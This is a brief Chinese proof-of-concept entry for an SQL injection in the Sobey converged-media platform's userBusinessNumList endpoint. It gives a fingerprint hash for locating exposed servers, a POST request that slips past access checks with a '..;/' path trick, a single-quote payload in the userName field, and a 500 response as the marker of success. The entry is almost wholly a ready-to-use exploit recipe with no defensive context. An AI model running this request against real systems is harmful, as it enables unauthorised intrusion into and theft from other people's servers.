# 索贝融媒体userBusinessNumList存在SQL注入漏洞

索贝融媒体 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="689611853"`
- **请求**：`POST /sobey-mchEditor/js/..;/mch/Jzt/Business/userBusinessNumList HTTP/1.1`

**Payload**
```
endTime=&siteCode=&startTime=&token=&userCode=admin&userName='
```
- **响应特征**：500